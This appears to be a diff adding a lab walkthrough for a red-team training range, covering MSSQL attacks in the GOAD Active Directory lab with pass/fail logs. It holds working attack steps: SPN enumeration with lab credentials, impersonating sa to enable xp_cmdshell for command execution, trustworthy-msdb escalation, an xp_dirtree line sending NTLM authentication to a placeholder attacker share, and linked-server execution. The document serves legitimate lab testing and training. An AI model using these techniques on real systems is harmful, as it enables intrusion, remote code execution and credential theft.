@@ -1,0 +1,109 @@
+# GOAD Part 7 - MSSQL (redStackPRO)
+<!-- lab-requires: mssql_impersonation, mssql_linked -->
+
+Reference: [mayfly - GOAD part 7](https://mayfly277.github.io/posts/GOADv2-pwning-part7/)
+(offline: `../_mayfly-source/_posts/2022-09-12-GOADv2-pwning-part7.md`).
+MSSQL abuse on the lab's SQL hosts, via impacket `mssqlclient.py -windows-auth`
+**through the hodor beacon's SOCKS proxy** (`proxychains -q mssqlclient.py …`;
+the SQL hosts are internal, see [part 1](part-01-recon.md) Step 1). These are
+config-based techniques (not patch-dependent), so they land cleanly.
+
+Full GOAD has two: **castelblack** (`192.168.56.22`) in north and **braavos**
+(`192.168.56.23`) in essos, which is what makes the cross-forest linked-server
+hop in Step 5 possible. GOAD-Light has castelblack only. Your deploy's
+`RANGE-BRIEFING.md` has the addresses.
+
+> **Status legend:** ✅ PASS · ❌ blocked · ⚠ partial/fidelity · ⏳ not run.
+
+## Headline result (2026-09-07)
+
+Multiple command-execution paths on the SQL box all work; the cross-forest
+trusted link is present but self-maps (fidelity delta).
+
+| Technique | Result |
+|-----------|--------|
+| Login impersonation (samwell.tarly → `sa`) → xp_cmdshell | ✅ RCE |
+| execute-as-user on trustworthy `msdb` (arya.stark → dbo → sa) → xp_cmdshell | ✅ RCE |
+| xp_dirtree NTLM coercion | ✅ fires |
+| Trusted link castelblack → braavos (cross-forest) | ⚠ present but self-mapping → double-hop `ANONYMOUS` |
+| Login-impersonation chain (brandon.stark → jon.snow) | ⚠ grant present; needs domain-prefixed login name |
+
+## Step 1 - Enumerate
+
+- [x] SPN/service discovery. `nxc` is not installed (see
+  `/opt/redstackpro/TOOLKIT.md`); impacket's `mssqlclient.py` is the substitute:
+  ```bash
+  proxychains -q GetUserSPNs.py -dc-ip 192.168.56.11 \
+    north.sevenkingdoms.local/jon.snow:iknownothing | grep MSSQLSvc
+  proxychains -q nmap -Pn -p1433 192.168.56.22 192.168.56.23
+  proxychains -q mssqlclient.py -windows-auth \
+    north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.22
+  ```
+  castelblack + braavos answer on 1433. `✅`
+
+## Step 2 - Login impersonation → sa (samwell.tarly)
+
+- [x] `enum_impersonate` shows `NORTH\samwell.tarly` (and `NORTH\Domain Users`)
+  have `IMPERSONATE` on `sa`. `exec_as_login sa` → `enable_xp_cmdshell` →
+  `xp_cmdshell whoami` → **`nt service\mssql$sqlexpress`**. `✅ RCE`
+
+## Step 3 - execute-as-user on trustworthy msdb (arya.stark)
+
+- [x] `use msdb` → `exec_as_user dbo` → context becomes `sa dbo@msdb` (msdb is
+  TRUSTWORTHY) → `xp_cmdshell whoami` → **`nt service\mssql$sqlexpress`**. `✅ RCE`
+  (On `master` the same impersonation gives no shell - trustworthy is the enabler.)
+
+## Step 4 - xp_dirtree NTLM coercion (hodor, 0 priv)
+
+- [x] `exec master.sys.xp_dirtree '\\<attacker>\share',1,1` fires an outbound
+  SMB auth as the SQL service account - capture/relay with a listener. `✅ fires`
+
+## Step 5 - Trusted links (cross-forest)
+<!-- lab-requires: mssql_linked -->
+
+- [x] `enum_links` shows a linked server **`braavos.essos.local`** (Is Self
+  Mapping: True). `✅ present`
+- [ ] `EXEC ('…xp_cmdshell…') AT [braavos.essos.local]` reaches braavos
+  (`braavos\SQLEXPRESS` responds) but fails **`Login failed for
+  NT AUTHORITY\ANONYMOUS LOGON`**. `⚠` The link **self-maps** (uses the caller's
+  context), so the second hop needs Kerberos delegation, which an NTLM login
+  can't carry (classic double-hop). mayfly's link has a static `jon.snow → sa`
+  remote-login mapping, which works without delegation.
+
+## Live verification (2026-09-14, GOAD-Light)
+
+Queried the `castelblack\SQLEXPRESS` instance directly (from the beacon on
+castelblack) and confirmed every precondition the local-RCE steps rely on:
+
+- **Instance - ✅** `@@SERVERNAME = castelblack\SQLEXPRESS` (matches the doc).
+- **Step 2 impersonation - ✅ (and stronger than written)** the `IMPERSONATE`
+  grant is held by **`NORTH\Domain Users`** - not just samwell.tarly. **hodor,
+  the patient zero, is a Domain User**, so Step 2 (impersonate `sa` →
+  `enable_xp_cmdshell` → RCE) runs **directly from the initial foothold identity**,
+  no extra credential needed.
+- **Step 3 trustworthy msdb - ✅** `msdb.is_trustworthy_on = 1` (the enabler for
+  the execute-as-user → sa path).
+- **Secure default - ✅** `xp_cmdshell = 0` (disabled), so the attacker enabling
+  it is a real state change, as the steps show.
+- **Step 5 trusted link - ➖ N/A on GOAD-Light (confirmed)** `sys.servers` has
+  **no linked server** - the `braavos.essos.local` cross-forest link needs the
+  essos forest, which GOAD-Light does not deploy. Steps 1-4 (all local to
+  castelblack) apply fully; Step 5 has no target here.
+
+## First-pass result log (2026-09-07, full GOAD)
+
+**Part 7 PASS on local RCE paths.** Impersonation (samwell→sa) and trustworthy
+msdb (arya→dbo) both give command execution as the SQL service account on
+castelblack; xp_dirtree coercion fires. The cross-forest trusted link exists but
+is self-mapping, so it double-hops to anonymous.
+
+### Findings → PAI
+- **PZ-10 (fidelity) - MSSQL trusted-link mapping.** Our link `braavos.essos.local`
+  self-maps → cross-forest RCE double-hops to `ANONYMOUS`. mayfly's link uses a
+  static remote-login mapping (`jon.snow → sa`). To reproduce mayfly's one-shot
+  trusted-link RCE, configure a remote-login mapping on the link (or set up the
+  delegation). Toggleable in the mssql role.
+- **Guide note:** impacket `mssqlclient` `use_link` chokes on a dotted FQDN link
+  name (`Incorrect syntax near '.'`); use raw `EXEC ('…') AT [braavos.essos.local]`.
+- **Guide note:** `exec_as_login` on a domain login needs the NETBIOS prefix
+  (`NORTH\jon.snow`), not the bare name.
